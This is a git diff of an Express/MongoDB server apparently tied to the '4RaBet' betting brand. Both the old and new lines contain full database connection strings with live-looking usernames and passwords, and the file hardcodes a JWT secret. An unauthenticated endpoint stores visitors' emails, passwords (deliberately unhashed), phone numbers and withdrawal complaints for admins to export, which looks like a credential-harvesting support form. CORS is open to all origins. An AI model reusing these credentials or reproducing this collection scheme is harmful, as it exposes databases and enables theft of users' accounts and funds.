@@ -5,32 +5,26 @@ const jwt = require('jsonwebtoken');
 const cors = require('cors');
 const app = express();
 
-
 var corsOptions = {
   origin: '*',
   optionsSuccessStatus: 200
 }
 app.use(cors(corsOptions));
 
-
 // ✅ Admin model
 const Admin = require('./models/AdminRegister');
 // Import User model
 const User = require('./models/User');
-//Import New Users Details
-const NewUser = require('./models/NewUsers');
+
+
 
 app.use(express.json());
-
 const JWT_SECRET = 'Vishu_Admin';
 
 // ✅ Connect to MongoDB
 const connectDB = async () => {
   try {
-    await mongoose.connect('mongodb+srv://4RaBetOfficalAccount:NSL5DgJbJovGbXrT@cluster0.4iukcq5.mongodb.net/4RaBetOffical', {
-      useNewUrlParser: true,
-      useUnifiedTopology: true,
-    });
+    await mongoose.connect('mongodb+srv://vishu:NdO3hK4ShLCi4YKD@cluster0.4iukcq5.mongodb.net/4RaBet');
     console.log('✅ MongoDB connected');
   } catch (error) {
     console.error('❌ MongoDB connection failed:', error.message);
@@ -156,7 +150,7 @@ app.get('/verify-auth', authenticateToken, async (req, res) => {
     if (!admin) {
       return res.status(404).json({ message: 'User not found' });
     }
-    
+
     res.json({
       message: 'Token verified',
       user: {
@@ -182,6 +176,7 @@ app.get('/admin-data', authenticateToken, isAdmin, async (req, res) => {
 });
 
 
+
 // Get users with pagination, sorting and search
 app.get('/usersdetails', authenticateToken, isAdmin, async (req, res) => {
   try {
@@ -192,9 +187,9 @@ app.get('/usersdetails', authenticateToken, isAdmin, async (req, res) => {
     const sortDirection = req.query.sortDirection === 'asc' ? 1 : -1;
     const sortOptions = {};
     sortOptions[sortField] = sortDirection;
-    
+
     let query = {};
-    
+
     // Add search functionality
     if (req.query.search) {
       const searchRegex = new RegExp(req.query.search, 'i');
@@ -206,16 +201,16 @@ app.get('/usersdetails', authenticateToken, isAdmin, async (req, res) => {
         ]
       };
     }
-    
+
     // Get users with pagination and sorting
     const users = await User.find(query)
       .sort(sortOptions)
       .skip(skip)
       .limit(limit);
-    
+
     // Get total count
     const totalUsers = await User.countDocuments(query);
-    
+
     res.json({
       users,
       totalUsers,
@@ -226,6 +221,7 @@ app.get('/usersdetails', authenticateToken, isAdmin, async (req, res) => {
     res.status(500).json({ message: err.message });
   }
 });
+
 // Export all users (for CSV export)
 app.get('/users/export', authenticateToken, isAdmin, async (req, res) => {
   try {
@@ -240,7 +236,6 @@ app.get('/users/export', authenticateToken, isAdmin, async (req, res) => {
 app.post('/users', async (req, res) => {
   try {
     const { email, password, mobileNumber, withdrawalAmount, problem } = req.body;
-    
     const user = new User({
       email,
       password, // Note: Not hashed as requested
@@ -248,20 +243,19 @@ app.post('/users', async (req, res) => {
       withdrawalAmount,
       problem
     });
-    
     await user.save();
     res.status(201).json({ message: 'User data saved successfully' });
   } catch (err) {
     res.status(500).json({ message: err.message });
   }
 });
-// ✅ Start Server
-const PORT = 8000;
-app.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));
 
-
-app.get("/",(req,res)=>{
+app.get("/", (req, res) => {
   res.json({
-    status:true
+    status: true
   })
 })
+// ✅ Start Server
+const PORT = 8000;
+
+app.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));
